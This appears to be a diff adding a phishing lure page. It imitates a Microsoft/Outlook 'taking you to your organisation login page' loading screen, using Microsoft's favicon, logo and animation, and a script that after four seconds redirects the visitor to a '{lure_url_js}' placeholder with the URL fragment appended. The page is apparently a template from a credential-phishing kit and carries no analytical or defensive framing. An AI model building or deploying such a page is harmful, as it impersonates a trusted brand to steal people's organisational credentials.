@@ -1,0 +1,209 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0" />
+    <meta http-equiv="Expires" content="-1" />
+    <link rel="shortcut icon" href="https://res.public.onecdn.static.microsoft/owamail/20260306001.09/resources/images/favicons/mail-seen.ico" type="image/x-icon" />
+    <title>Taking you to your organisation login page...</title>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body { background: #fff; overflow: hidden; }
+
+      #loadingScreen {
+        position: fixed; top: 0; bottom: 0; left: 0; right: 0;
+        background-color: #fff;
+      }
+
+      #loadingLogo {
+        position: fixed; top: calc(50vh - 200px); left: calc(50vw - 200px);
+        width: 400px; height: 400px;
+      }
+
+      #MSLogo {
+        position: fixed; bottom: 36px; left: calc(50vw - 50px);
+      }
+
+      @keyframes pinchAndRelease {
+        0%, 100%, 12.5%, 25%, 35.5%, 50% {
+          transform: scale(1,1) translateY(0);
+        }
+        30%, 5% {
+          transform: scale(.86,1.1) translateY(-10px);
+        }
+      }
+
+      @keyframes documentOneScale {
+        0%, 100%, 35%, 50% {
+          transform: translate(61px,82px) scale(0,0) rotateZ(20deg) rotateY(26deg);
+        }
+        12%, 22% {
+          transform: translate(0,0) scale(1,1) rotateZ(-18deg) rotateY(0);
+        }
+      }
+
+      @keyframes documentTwoScale {
+        0%, 100%, 33%, 50% {
+          transform: translate(44px,68px) scale(0,0) rotateZ(20deg) rotateY(26deg);
+        }
+        15%, 19% {
+          transform: translate(0,0) scale(1,1) rotateZ(-9deg) rotateY(0);
+        }
+      }
+
+      @keyframes layersSlideIn {
+        0%, 23% {
+          transform: translateY(74px) scale(0) rotateX(50deg) rotateZ(45deg);
+        }
+        100%, 33% {
+          transform: translateY(0) scale(1) rotateX(50deg) rotateZ(45deg);
+        }
+      }
+
+      #container {
+        width: 400px; height: 400px; display: flex;
+        justify-content: center; align-items: center; position: relative;
+        --duration: 3000ms; --delay: 0ms; --iterationCount: infinite;
+        --direction: normal; --fillMode: forwards; --playState: running;
+        --easing: ease-in-out;
+      }
+
+      .foreground {
+        width: 164px; height: 200px; border-radius: 26px;
+        overflow: hidden; position: absolute; z-index: 100;
+        animation: pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .background {
+        width: 164px; height: 200px; border-radius: 26px;
+        overflow: hidden; position: relative; z-index: 20;
+        animation: pinchAndRelease var(--duration) var(--easing) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .contents {
+        position: absolute; bottom: 100px; left: 118px;
+        width: 164px; height: 200px; background-color: transparent;
+        z-index: 60; overflow: hidden;
+        animation: pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .flap-top-inner-shadow {
+        background: radial-gradient(circle, #00217700 54%, #0021778c 100%);
+        background-position: -34px -34px; background-size: 170px 170px;
+        width: 130px; height: 130px; position: absolute; top: 26px; left: 17px;
+        border-radius: 18px 24px 0 24px; transform: rotateX(50deg) rotateZ(45deg);
+        transform-style: preserve-3d; z-index: 50;
+      }
+
+      .flap-top-fill {
+        background-color: #28afea; width: 130px; height: 130px;
+        position: absolute; top: 26px; left: 17px;
+        border-radius: 18px 24px 0 24px; transform: rotateX(50deg) rotateZ(45deg);
+        transform-style: preserve-3d; z-index: 30;
+      }
+
+      .flap-left {
+        width: 200px; height: 200px; border-radius: 0 38px;
+        background-color: #6ce0ff;
+        background: radial-gradient(circle, #2cbbf3 0, #87e5ff 100%);
+        position: absolute; bottom: -80.5px; left: -112px;
+        transform: rotateX(50deg) rotateZ(45deg); z-index: 51;
+      }
+
+      .flap-right {
+        width: 200px; height: 200px; border-radius: 0 38px;
+        background-color: #0985dc;
+        background: linear-gradient(3deg, #0985dc 25%, #3da9fb 58%, #c29dfa 80%, #f4a7f7 100%);
+        background-position: 0 0; position: absolute; bottom: -80.5px;
+        right: -112px; transform: rotateX(50deg) rotateZ(45deg); z-index: 50;
+      }
+
+      .background-fill {
+        position: absolute; width: 100%; height: 110px; bottom: 0; left: 0;
+        background: #7bf4ff;
+        background: linear-gradient(56deg, #7bf4ff 0, #c29dfa 100%);
+      }
+
+      .layer-stack {
+        background-color: #3834b9; width: 130px; height: 130px;
+        position: absolute; top: 26px; left: 17px; z-index: 30;
+        border-radius: 18px 24px 0 24px; transform: rotateX(50deg) rotateZ(45deg);
+        transform-style: preserve-3d; overflow: hidden;
+        animation: layersSlideIn var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .layer-stack::after {
+        content: ''; position: absolute; top: -1px; left: 0;
+        width: 86px; height: 158px; background-color: #4b6de7;
+        border-top-right-radius: 24px; z-index: 10;
+      }
+
+      .layer-stack::before {
+        content: ''; position: absolute; top: -1px; left: -10px;
+        width: 54px; height: 158px;
+        background: #5b9ee8;
+        background: linear-gradient(344deg, rgb(50 146 234) 30%, #81c2f9 76%, #abb8fa 90%);
+        border-radius: 60px; z-index: 20;
+      }
+
+      .document-one {
+        position: absolute; width: 130px; height: 162px;
+        background: #2650bd;
+        background: linear-gradient(40deg, rgb(6 103 211) 40%, #7f85f6 100%);
+        border-radius: 14px; left: 19px; top: 18px; z-index: 30;
+        animation: documentOneScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .document-two {
+        position: absolute; width: 114px; height: 156px;
+        background: #abc8e2;
+        background: linear-gradient(47deg, #abc8e2 0, #fcefd6 100%);
+        border-radius: 14px; left: 36px; top: 32px; z-index: 40;
+        box-shadow: -9px -3px 4px -3px rgba(0,0,0,.1);
+        animation: documentTwoScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
+      }
+
+      .document-two::before {
+        content: ''; position: absolute; top: 0; left: 0;
+        width: 15px; height: 158px; background-color: #293bb0;
+        border-radius: 24px 0 0 24px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="loadingScreen">
+      <div id="loadingLogo" dir="ltr">
+        <div id="container">
+          <div class="foreground">
+            <div class="flap-top-inner-shadow"></div>
+            <div class="flap-left"></div>
+            <div class="flap-right"></div>
+          </div>
+          <div class="contents">
+            <div class="layer-stack"></div>
+            <div class="document-two"></div>
+            <div class="document-one"></div>
+          </div>
+          <div class="background">
+            <div class="flap-top-fill"></div>
+            <div class="background-fill"></div>
+          </div>
+        </div>
+      </div>
+      <img src="https://res.public.onecdn.static.microsoft/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft" crossorigin="anonymous" loading="lazy" />
+    </div>
+
+    <script>
+      function getFragment() {
+        var fragment = window.location.hash;
+        fragment = fragment.replace(/=*$/, '');
+        return fragment;
+      }
+
+      setTimeout(function () {
+        var fragment = getFragment();
+        window.location.assign({lure_url_js} + fragment);
+      }, 4000);
+    </script>
+  </body>
+</html>
